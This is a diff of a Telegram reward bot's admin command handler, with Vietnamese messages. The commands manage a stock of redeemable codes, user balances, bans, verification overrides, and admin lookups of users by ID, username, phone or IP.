+        cmd_type = admin_input_states.pop(user_id)
+        text_input = (message.text or "").strip()
+
+        if cmd_type == "broadcast":
+            args = text_input.split()
+            raw_text = f"/broadcast {text_input}"
+        elif cmd_type == "addstock":
+            args = text_input.split()
+            raw_text = f"/addstock {text_input}"
+        elif cmd_type in ("addbal", "subbal"):
+            parts = text_input.split()
+            if len(parts) >= 2:
+                args = parts
+                raw_text = f"/{cmd_type} {parts[0]} {parts[1]}"
+            else:
+                await message.reply_text(
+                    f"{E['CROSS']} Sai cú pháp. Vui lòng thử lại.",
+                    parse_mode="HTML",
+                )
+                return
+        elif cmd_type in (
+            "info",
+            "detail",
+            "ban",
+            "unban",
+            "banwd",
+            "unbanwd",
+        ):
+            parts = text_input.split()
+            if parts:
+                args = [parts[0]]
+                raw_text = f"/{cmd_type} {parts[0]}"
+            else:
+                await message.reply_text(
+                    f"{E['CROSS']} Vui lòng nhập ID hợp lệ.", parse_mode="HTML"
+                )
+                return
+        else:
+            if not text_input:
+                await message.reply_text(
+                    f"{E['CROSS']} Vui lòng nhập dữ liệu hợp lệ.",
+                    parse_mode="HTML",
+                )
+                return
+            args = text_input.split()
+            raw_text = f"/{cmd_type} {text_input}"
+        cmd = f"/{cmd_type}"
+
     try:
-        if cmd == "/reset":
-            await db_query(
-                """
-                INSERT INTO users_history (user_id, first_seen_at)
-                SELECT user_id, COALESCE(joined_at, %s) FROM users
-                ON CONFLICT (user_id) DO NOTHING
-                """,
-                (get_now_str(),),
-                commit=True,
-            )
-
-            await db_query("TRUNCATE TABLE users, transactions RESTART IDENTITY", commit=True)
-
-            user_msg_tracker.clear()
-            temp_bans.clear()
-            user_withdraw_state.clear()
-            admin_checkdl_state.clear()
-            admin_spl_state.clear()
-
-            await db_query(
-                "INSERT INTO users (user_id, username, balance, joined_at, skip_ref_once) "
-                "VALUES (%s, %s, 0, %s, 1) ON CONFLICT (user_id) DO NOTHING",
-                (message.from_user.id, message.from_user.username or "", get_now_str()),
-                commit=True,
-            )
-
-            await message.reply_text(
-                f"{E['REFRESH']} <b>ĐÃ RESET TOÀN BỘ HỆ THỐNG!</b>\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"• Toàn bộ người dùng & lịch sử giao dịch đã được xóa hoàn toàn.\n"
-                f"• Những người <b>đã từng dùng bot</b> sẽ <b>KHÔNG được tính ref</b> khi bấm lại link của người khác.\n"
-                f"• Chỉ người dùng <b>hoàn toàn mới</b> mới được tính ref bình thường.\n"
-                f"• Nếu muốn reset cứng (cho phép user cũ tính ref lại), dùng <code>/resetcung</code>.",
-                parse_mode="HTML"
-            )
-
-        elif cmd == "/resetcung":
-            await db_query("TRUNCATE TABLE users, transactions, users_history RESTART IDENTITY", commit=True)
-            user_msg_tracker.clear()
-            temp_bans.clear()
-            user_withdraw_state.clear()
-            admin_checkdl_state.clear()
-            admin_spl_state.clear()
-
-            await db_query(
-                "INSERT INTO users (user_id, username, balance, joined_at, skip_ref_once) "
-                "VALUES (%s, %s, 0, %s, 0) ON CONFLICT (user_id) DO NOTHING",
-                (message.from_user.id, message.from_user.username or "", get_now_str()),
-                commit=True,
-            )
-
-            await message.reply_text(
-                f"{E['REFRESH']} <b>ĐÃ RESET CỨNG TOÀN BỘ (kể cả lịch sử user)!</b>\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"• Từ giờ <b>mọi người dùng đều được tính ref như user mới</b>.\n"
-                f"• Bot đã quên hoàn toàn lịch sử user cũ.",
-                parse_mode="HTML"
-            )
-
-        elif cmd == "/sd":
-            users_with_balance = await db_query(
-                "SELECT user_id, username, balance, phone_number, bank_info, joined_at FROM users WHERE balance > 0 ORDER BY balance DESC",
-                fetchall=True
-            )
-            if not users_with_balance:
-                await message.reply_text(f"{E['ALERT1']} <b>Không có người dùng nào còn số dư trong hệ thống.</b>", parse_mode="HTML")
+        if cmd == "/addstock":
+            lines = raw_text.split(maxsplit=1)
+            if len(lines) < 2:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/addstock mã_code1 mã_code2 ...</code>\n"
+                    f"Hoặc xuống dòng từng mã code để thêm số lượng lớn. Bot sẽ tự động phân tích, lọc code trùng và thêm vào kho.",
+                    parse_mode="HTML",
+                )
+                return
+            codes_raw = lines[1]
+            codes = re.split(r"[\s\n]+", codes_raw.strip())
+            codes = [c.strip() for c in codes if c.strip()]
+            if not codes:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy mã code hợp lệ.",
+                    parse_mode="HTML",
+                )
                 return
 
-            msg = f"{E['MONEY']} <b>DANH SÁCH NGƯỜI DÙNG CÒN SỐ DƯ</b>\n━━━━━━━━━━━━━━━━━━\n"
-            msg += f"• Tổng số tài khoản còn số dư: <b>{len(users_with_balance)}</b>\n\n"
+            unique_codes = list(dict.fromkeys(codes))
+            dup_in_input = len(codes) - len(unique_codes)
 
-            for u_id, u_username, u_balance, u_phone, u_bank, u_joined in users_with_balance:
-                uname = f"@{u_username}" if u_username else f"<code>{u_id}</code>"
-                msg += f"👤 <b>User:</b> {uname} (<code>{u_id}</code>)\n"
-                msg += f"• {E['UP']} <b>Số dư:</b> <code>{u_balance:,}đ</code>\n"
-                msg += f"• {E['PHONE']} <b>SĐT:</b> <code>{u_phone or 'Chưa xác minh'}</code>\n"
-                msg += f"• {E['LOCK']} <b>Ngân hàng:</b> <code>{u_bank or 'Chưa liên kết'}</code>\n"
-                msg += f"• {E['CALENDAR']} <b>Tham gia:</b> <code>{u_joined or 'N/A'}</code>\n"
-                msg += "----------------------------------\n"
+            def add_codes_auto(cursor):
+                now = get_now_str()
+                cursor.execute(
+                    "SELECT code_val FROM code_stock WHERE code_val = ANY(%s)",
+                    (unique_codes,),
+                )
+                existing = {r[0] for r in cursor.fetchall()}
+                new_codes = [c for c in unique_codes if c not in existing]
+                for c in new_codes:
+                    cursor.execute(
+                        "INSERT INTO code_stock (type_code, code_val, created_at) VALUES (%s, %s, %s)",
+                        (1, c, now),
+                    )
+                return len(new_codes), len(existing)
 
-                if len(msg) > 3500:
-                    await message.reply_text(msg, parse_mode="HTML")
-                    msg = ""
-                await asyncio.sleep(0.02)
+            added_count, dup_in_stock = await db_transaction(add_codes_auto)
+            total_skipped = dup_in_input + dup_in_stock
+            await message.reply_text(
+                f"{E['CHECK2']} <b>THÊM CODE VÀO KHO HOÀN TẤT!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['PLUS']} Đã thêm mới: <b>{added_count:,}</b> mã code\n"
+                f"{E['WARN']} Đã bỏ qua (trùng): <b>{total_skipped:,}</b> mã\n"
+                f"   • Trùng trong danh sách nhập: <b>{dup_in_input:,}</b>\n"
+                f"   • Trùng với kho hiện có: <b>{dup_in_stock:,}</b>",
+                parse_mode="HTML",
+            )
 
-            if msg.strip():
-                await message.reply_text(msg, parse_mode="HTML")
+        elif cmd == "/liststock":
+            codes_list = await db_query(
+                "SELECT id, type_code, code_val, created_at FROM code_stock WHERE is_used=0 ORDER BY id DESC LIMIT 50",
+                fetchall=True,
+            )
+            res_total = await db_query(
+                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
+                fetchone=True,
+            )
+            total_count = res_total[0] if res_total else 0
+            if not codes_list:
+                await message.reply_text(
+                    f"{E['BANDAGE']} <b>Kho code hiện đang trống!</b>",
+                    parse_mode="HTML",
+                )
+                return
+            msg = (
+                f"{E['TOP']} <b>DANH SÁCH TOÀN BỘ MÃ CODE TRONG KHO</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['INBOX']} Tổng số lượng chưa dùng: <b>{total_count:,}</b> code\n"
+                f"{E['RIGHT']} <i>Hiển thị 50 mã code mới nhất:</i>\n\n"
+            )
+            for cid, tcode, cval, cat in codes_list:
+                msg += f"• ID: <code>{cid}</code> | Code: <code>{cval}</code> | Thêm lúc: <code>{cat}</code>\n"
+            if len(msg) > 4000:
+                msg = msg[:3950] + "\n\n<i>... (Danh sách quá dài đã được rút gọn)</i>"
+            await message.reply_text(msg, parse_mode="HTML")
 
-        elif cmd == "/checkdl":
+        elif cmd == "/stock":
+            res1 = await db_query(
+                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
+                fetchone=True,
+            )
+            cnt = res1[0] if res1 else 0
+            await message.reply_text(
+                f"{E['TOP']} <b>THỐNG KÊ KHO CODE HIỆN TẠI</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"• Tổng số code chưa sử dụng: <b>{cnt:,}</b> code",
+                parse_mode="HTML",
+            )
+
+        elif cmd in ("/clearstock", "/clearstockall"):
+
+            def clear_all_codes(cursor):
+                cursor.execute("SELECT code_val FROM code_stock")
+                rows = cursor.fetchall()
+                now = get_now_str()
+                for (cval,) in rows:
+                    cursor.execute(
+                        "INSERT INTO code_deleted_log (code_val, deleted_at) VALUES (%s, %s)",
+                        (cval, now),
+                    )
+                cursor.execute("DELETE FROM code_stock")
+                return len(rows)
+
+            count_deleted = await db_transaction(clear_all_codes)
+            await message.reply_text(
+                f"{E['CROSS']} <b>ĐÃ XÓA TOÀN BỘ KHO CODE!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"• Đã xóa sạch: <b>{count_deleted:,}</b> mã code khỏi hệ thống (Đã lưu vào lịch sử xóa).",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/delhistory":
+            deleted_logs = await db_query(
+                "SELECT id, code_val, deleted_at FROM code_deleted_log ORDER BY id DESC LIMIT 50",
+                fetchall=True,
+            )
+            if not deleted_logs:
+                await message.reply_text(
+                    f"{E['BANDAGE']} <b>Chưa có lịch sử mã code nào bị xóa!</b>",
+                    parse_mode="HTML",
+                )
+                return
+            msg = (
+                f"{E['INBOX']} <b>LỊCH SỬ MÃ CODE ĐÃ XÓA</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['RIGHT']} <i>Hiển thị 50 mã code đã xóa gần nhất:</i>\n\n"
+            )
+            for cid, cval, cat in deleted_logs:
+                msg += f"• ID: <code>{cid}</code> | Code: <code>{cval}</code> | Xóa lúc: <code>{cat}</code>\n"
+            if len(msg) > 4000:
+                msg = msg[:3950] + "\n\n<i>... (Danh sách quá dài đã được rút gọn)</i>"
+            await message.reply_text(msg, parse_mode="HTML")
+
+        elif cmd == "/buyhistory":
+            rows = await db_query(
+                """
+                SELECT t.user_id, u.username, t.type, t.details, t.created_at
+                FROM transactions t
+                LEFT JOIN users u ON t.user_id = u.user_id
+                WHERE t.type LIKE 'Mua Code%%' AND t.status = 'Thành công'
+                ORDER BY t.id DESC LIMIT 30
+                """,
+                fetchall=True,
+            )
+            if not rows:
+                await message.reply_text(
+                    f"{E['BANDAGE']} <b>Chưa có người dùng nào rút code!</b>",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['TOP']} <b>DANH SÁCH THÀNH VIÊN ĐÃ RÚT CODE (30 MỚI NHẤT)</b>\n━━━━━━━━━━━━━━━━━━\n\n"
+            for r_user_id, username, code_type_str, details, created_at in rows:
+                user_tag = (
+                    f"@{username}" if username else "Chưa có @username"
+                )
+                msg += (
+                    f"{E['RIGHT']} <b>User:</b> {user_tag} | <b>ID:</b> <code>{r_user_id}</code>\n"
+                    f"{E['CARD']} <b>Loại Giao Dịch:</b> <code>{code_type_str}</code>\n"
+                    f"{E['SHIELD']} <b>Nội dung:</b> <code>{details or 'Không rõ'}</code>\n"
+                    f"{E['HOURGLASS']} <b>Thời gian:</b> <code>{created_at}</code>\n"
+                    "----------------------------------\n"
+                )
+            await message.reply_text(msg, parse_mode="HTML")
+
+        elif cmd in ("/addbal", "/subbal"):
+            if len(args) < 2:
+                await message.reply_text(
+                    f"Cú pháp: <code>{cmd} USER_ID SO_TIEN</code>",
+                    parse_mode="HTML",
+                )
+                return
+            target_id = int(args[0])
+            amount = int(args[1])
+            if amount <= 0:
+                await message.reply_text(
+                    f"{E['CROSS']} Số tiền phải lớn hơn 0.", parse_mode="HTML"
+                )
+                return
+            exists = await db_query(
+                "SELECT user_id FROM users WHERE user_id=%s",
+                (target_id,),
+                fetchone=True,
+            )
+            if not exists:
+                await message.reply_text(
+                    f"{E['CROSS']} User chưa tồn tại.", parse_mode="HTML"
+                )
+                return
+            if cmd == "/addbal":
+
+                def add_money(cursor):
+                    cursor.execute(
+                        "UPDATE users SET balance=balance+%s WHERE user_id=%s",
+                        (amount, target_id),
+                    )
+                    cursor.execute(
+                        "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
+                        (
+                            target_id,
+                            "Nạp Tiền (Admin)",
+                            amount,
+                            "Thành công",
+                            get_now_str(),
+                            "Cộng từ Admin",
+                        ),
+                    )
+                    return True
+
+                await db_transaction(add_money)
+                await message.reply_text(
+                    f"{E['CHECK2']} Đã cộng <b>+{amount:,}đ</b> cho ID <code>{target_id}</code>.",
+                    parse_mode="HTML",
+                )
+            else:
+
+                def deduct(cursor):
+                    cursor.execute(
+                        "UPDATE users SET balance=balance-%s WHERE user_id=%s AND balance>=%s",
+                        (amount, target_id, amount),
+                    )
+                    if cursor.rowcount != 1:
+                        return False
+                    cursor.execute(
+                        "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
+                        (
+                            target_id,
+                            "Trừ Tiền (Admin)",
+                            amount,
+                            "Thành công",
+                            get_now_str(),
+                            "Trừ từ Admin",
+                        ),
+                    )
+                    return True
+
+                ok = await db_transaction(deduct)
+                if not ok:
+                    await message.reply_text(
+                        f"{E['CROSS']} Số dư user không đủ để trừ.",
+                        parse_mode="HTML",
+                    )
+                    return
+                await message.reply_text(
+                    f"{E['CROSS']} Đã trừ <b>-{amount:,}đ</b> của ID <code>{target_id}</code>.",
+                    parse_mode="HTML",
+                )
+
+        elif cmd == "/zerobal":
+            await db_query("UPDATE users SET balance = 0", commit=True)
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI SỐ DƯ THÀNH CÔNG!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"Toàn bộ số dư của tất cả người dùng trong cơ sở dữ liệu đã được đưa về <b>0đ</b>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/ban":
             if len(args) < 1:
-                await message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/checkdl USER_ID</code>", parse_mode="HTML")
+                await message.reply_text(
+                    "Cú pháp: <code>/ban USER_ID</code>", parse_mode="HTML"
+                )
+                return
+            target_id = int(args[0])
+            await db_query(
+                "UPDATE users SET is_banned=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            user_withdraw_state.pop(target_id, None)
+            await message.reply_text(
+                f"{E['CROSS']} Đã cấm vĩnh viễn user <code>{target_id}</code>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/unban":
+            if len(args) < 1:
+                await message.reply_text(
+                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/unban USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            target_id = int(args[0])
+            await db_query(
+                "UPDATE users SET is_banned=0 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} <b>Đã mở ban tài khoản cho ID:</b> <code>{target_id}</code>",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/banwd":
+            if len(args) < 1:
+                await message.reply_text(
+                    "Cú pháp: <code>/banwd USER_ID</code>", parse_mode="HTML"
+                )
+                return
+            target_id = int(args[0])
+            await db_query(
+                "UPDATE users SET is_withdraw_banned=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            user_withdraw_state.pop(target_id, None)
+            await message.reply_text(
+                f"{E['CROSS']} Đã cấm rút code ID <code>{target_id}</code>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/unbanwd":
+            if len(args) < 1:
+                await message.reply_text(
+                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/unbanwd USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            target_id = int(args[0])
+            await db_query(
+                "UPDATE users SET is_withdraw_banned=0 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} <b>Đã mở cấm rút code cho ID:</b> <code>{target_id}</code>",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/unall":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/unall USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
+                return
+
+            await db_query(
+                "UPDATE users SET is_banned=0, is_withdraw_banned=0, skip_ip=1, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            pending_captcha_users.pop(target_id, None)
+            pending_miniapp_captcha.pop(target_id, None)
+            pending_camera_verified.discard(target_id)
+            temp_bans.pop(target_id, None)
+
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ MỞ TẤT CẢ HẠN CHẾ CHO ID:</b> <code>{target_id}</code>\n"
+                f"• Đã gỡ cấm tài khoản, gỡ cấm rút code, vượt Captcha (cả Captcha MiniApp/CCCAM) và bỏ qua kiểm tra IP.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/uncap":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/uncap USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
+                return
+
+            await db_query(
+                "UPDATE users SET is_banned=0, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            pending_captcha_users.pop(target_id, None)
+            pending_miniapp_captcha.pop(target_id, None)
+            pending_camera_verified.discard(target_id)
+
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ MỞ KHÓA CAPTCHA/TÀI KHOẢN CHO ID:</b> <code>{target_id}</code>\n"
+                f"• Người dùng có thể tiếp tục thao tác bình thường.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/skipip":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/skipip USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
+                return
+            await db_query(
+                "UPDATE users SET skip_ip=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} Đã thiết lập bỏ qua bước xác minh IP cho ID: <code>{target_id}</code>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/unip":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/unip USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
+                return
+            await db_query(
+                "UPDATE users SET is_banned=0, is_withdraw_banned=1 WHERE user_id=%s",
+                (target_id,),
+                commit=True,
+            )
+            await message.reply_text(
+                f"{E['CHECK2']} Đã mở khóa trùng IP và bỏ qua bước kiểm tra IP cho ID: <code>{target_id}</code>.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/resetverify":
+            await db_query(
+                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
+                commit=True,
+            )
+            pending_miniapp_captcha.clear()
+            pending_camera_verified.clear()
+            await message.reply_text(
+                f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI TRẠNG THÁI XÁC MINH!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"Toàn bộ thành viên trong hệ thống sẽ phải thực hiện lại các bước kiểm tra (SĐT, CCCAM, Camera, Captcha MiniApp, IP, Kênh, Captcha) khi tương tác với Bot tiếp theo.",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/info":
+            if len(args) < 1:
+                await message.reply_text(
+                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/info USER_ID</code>",
+                    parse_mode="HTML",
+                )
                 return
             try:
                 target_id = int(args[0])
             except (ValueError, TypeError):
-                await message.reply_text("❌ USER_ID không hợp lệ.")
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
                 return
-
-            target_user = await db_query("SELECT user_id, username FROM users WHERE user_id=%s", (target_id,), fetchone=True)
-            if not target_user:
-                await message.reply_text(f"❌ Không tìm thấy user ID <code>{target_id}</code>.", parse_mode="HTML")
+            text = await build_user_info_text(target_id)
+            if not text:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy user này.", parse_mode="HTML"
+                )
                 return
+            await message.reply_text(text, parse_mode="HTML")
 
-            admin_checkdl_state[message.from_user.id] = target_id
+        elif cmd == "/detail":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/detail USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except (ValueError, TypeError):
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
+                return
+            u = await db_query(
+                "SELECT user_id, username, balance, referrer_id, is_banned, is_withdraw_banned, joined_at, phone_number, ip_address FROM users WHERE user_id=%s",
+                (target_id,),
+                fetchone=True,
+            )
+            if not u:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy ID <code>{target_id}</code> trong cơ sở dữ liệu.",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                bot_info = await context.bot.get_me()
+                bot_username = bot_info.username
+            except Exception:
+                bot_username = "Bot"
+            ref_id = u[3]
+            ref_info_text = f"{E['DOWN']} <b>Không có (Không bấm link của ai)</b>"
+            if ref_id:
+                ref_user = await db_query(
+                    "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                    (ref_id,),
+                    fetchone=True,
+                )
+                if ref_user:
+                    ref_uname = (
+                        f"@{ref_user[1]}"
+                        if ref_user[1]
+                        else "Chưa đặt username"
+                    )
+                    ref_phone = (
+                        ref_user[2] if ref_user[2] else "Chưa xác minh SĐT"
+                    )
+                    ref_ip = (
+                        ref_user[3]
+                        if len(ref_user) > 3 and ref_user[3]
+                        else "Chưa xác minh IP"
+                    )
+                    ref_bot_link = f"https://t.me/{bot_username}?start={ref_id}"
+                    ref_info_text = (
+                        f"{E['CHECK2']} <b>NGƯỜI GIỚI THIỆU:</b>\n"
+                        f"{E['TARGET']} <b>ID:</b> <code>{ref_user[0]}</code>\n"
+                        f"{E['PHONE']} <b>SĐT:</b> <code>{ref_phone}</code>\n"
+                        f"{E['GLOBE']} <b>IP:</b> <code>{ref_ip}</code>\n"
+                        f"{E['CROWN']} <b>User:</b> {ref_uname}\n"
+                        f"{E['RIGHT']} <b>Link Bot Ref:</b> <code>{ref_bot_link}</code>"
+                    )
+                else:
+                    ref_info_text = f"{E['WARN']} <b>ID Giới thiệu:</b> <code>{ref_id}</code> (Dữ liệu đã bị xoá)"
+            u_uname = f"@{u[1]}" if u[1] else "Chưa đặt username"
+            u_phone = u[7] if u[7] else "Chưa xác minh SĐT"
+            u_ip = u[8] if len(u) > 8 and u[8] else "Chưa xác minh IP"
+            u_bot_link = f"https://t.me/{bot_username}?start={u[0]}"
+            invited_count = await get_valid_referrals_count(target_id)
+            msg = (
+                f"{E['BLUSH']} <b>KIỂM TRA THÔNG TIN ID:</b> <code>{target_id}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['TOP']} <b>THÔNG TIN ĐỐI TƯỢNG:</b>\n"
+                f"{E['TARGET']} <b>ID:</b> <code>{u[0]}</code>\n"
+                f"{E['PHONE']} <b>SĐT:</b> <code>{u_phone}</code>\n"
+                f"{E['GLOBE']} <b>IP:</b> <code>{u_ip}</code>\n"
+                f"{E['CROWN']} <b>User:</b> {u_uname}\n"
+                f"{E['MONEY']} <b>Số dư:</b> <code>{u[2]:,}đ</code>\n"
+                f"{E['ROCKET']} <b>Đã mời thành công:</b> <code>{invited_count}</code> người\n"
+                f"{E['DOWN']} <b>Link Bot Ref:</b> <code>{u_bot_link}</code>\n"
+                f"{E['CROSS']} <b>Khóa TK:</b> <b>{'CÓ' if u[4] else 'KHÔNG'}</b>\n"
+                f"{E['CROSS']} <b>Cấm rút:</b> <b>{'CÓ' if u[5] else 'KHÔNG'}</b>\n"
+                f"{E['HOURGLASS']} <b>Tham gia:</b> <code>{u[6]}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{ref_info_text}"
+            )
             await message.reply_text(
-                f"{E['CALENDAR']} <b>YÊU CẦU NHẬP NGÀY THÁNG NĂM</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"Bạn đang kiểm tra danh sách mời của ID: <code>{target_id}</code>\n\n"
-                f"{E['ARROW_DOWN']} Vui lòng gửi ngày tháng năm (Ví dụ: <code>1-10-2026</code> hoặc <code>2026-10-01</code>) để bot lọc danh sách:",
-                parse_mode="HTML"
+                msg, parse_mode="HTML", disable_web_page_preview=True
             )
 
-        elif cmd == "/tong":
+        elif cmd == "/find":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/find ID | @username | số điện thoại | IP</code>",
+                    parse_mode="HTML",
+                )
+                return
+            kw = args[0].replace("@", "").strip()
+            like_kw = f"%{kw}%"
+            if kw.isdigit() and len(kw) >= 8:
+                rows = await db_query(
+                    "SELECT user_id, username, balance, is_banned, is_withdraw_banned, phone_number, ip_address FROM users "
+                    "WHERE user_id=%s OR phone_number LIKE %s LIMIT 15",
+                    (int(kw), like_kw),
+                    fetchall=True,
+                )
+            else:
+                rows = await db_query(
+                    "SELECT user_id, username, balance, is_banned, is_withdraw_banned, phone_number, ip_address FROM users "
+                    "WHERE username ILIKE %s OR ip_address LIKE %s OR phone_number LIKE %s LIMIT 15",
+                    (like_kw, like_kw, like_kw),
+                    fetchall=True,
+                )
+            if not rows:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Không tìm thấy kết quả cho: <code>{kw}</code>",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['TOP']} <b>KẾT QUẢ TÌM KIẾM:</b> <code>{kw}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
+            for u_id, u_name, bal, b1, b2, ph, ip in rows:
+                msg += (
+                    f"{E['RIGHT']} <b>{('@' + u_name) if u_name else 'Chưa có @username'}</b> | ID: <code>{u_id}</code>\n"
+                    f"   {E['MONEY']} <code>{bal:,}đ</code> | Khóa: <b>{'CÓ' if b1 else 'KHÔNG'}</b> | Cấm rút: <b>{'CÓ' if b2 else 'KHÔNG'}</b>\n"
+                    f"   {E['PHONE']} <code>{ph or 'N/A'}</code> | {E['GLOBE']} <code>{ip or 'N/A'}</code>\n"
+                    "----------------------------------\n"
+                )
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
+
+        elif cmd == "/lookup":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/lookup IP | SĐT | @username | USER_ID</code>",
+                    parse_mode="HTML",
+                )
+                return
+            keyword = " ".join(args).strip()
+            search_key = keyword.replace("@", "").strip()
+
+            users_found = []
+            if search_key.isdigit() and len(search_key) >= 8:
+                users_found = await db_query(
+                    "SELECT user_id, username, balance, referrer_id, is_banned, "
+                    "is_withdraw_banned, joined_at, phone_number, ip_address, camera_photo_token "
+                    "FROM users WHERE user_id=%s OR phone_number LIKE %s LIMIT 5",
+                    (int(search_key), f"%{search_key}%"),
+                    fetchall=True,
+                ) or []
+            if not users_found:
+                users_found = await db_query(
+                    "SELECT user_id, username, balance, referrer_id, is_banned, "
+                    "is_withdraw_banned, joined_at, phone_number, ip_address, camera_photo_token "
+                    "FROM users WHERE username ILIKE %s OR phone_number=%s OR ip_address=%s LIMIT 5",
+                    (f"%{search_key}%", search_key, search_key),
+                    fetchall=True,
+                ) or []
+
+            if not users_found:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy user nào khớp với: <code>{keyword}</code>",
+                    parse_mode="HTML",
+                )
+                return
+
+            for u in users_found:
+                u_id, u_uname, bal, ref_id, ban1, ban2, joined, phone, ip, photo_token = u
+                invited_count = await get_valid_referrals_count(u_id)
+                username_str = f"@{u_uname}" if u_uname else "Chưa có"
+                ref_str = str(ref_id) if ref_id else "Không có"
+
+                info = (
+                    f"{E['CROWN']} <b>FULL THÔNG TIN USER</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"{E['RIGHT']} ID: <code>{u_id}</code>\n"
+                    f"{E['PHONE']} SĐT: <code>{phone or 'Chưa xác minh'}</code>\n"
+                    f"{E['GLOBE']} IP: <code>{ip or 'Chưa xác minh'}</code>\n"
+                    f"{E['CROWN2']} Username: {username_str}\n"
+                    f"{E['MONEY']} Số dư: <code>{bal:,}đ</code>\n"
+                    f"{E['ROCKET']} Đã mời: <code>{invited_count}</code> người\n"
+                    f"{E['RIGHT']} Người giới thiệu: <code>{ref_str}</code>\n"
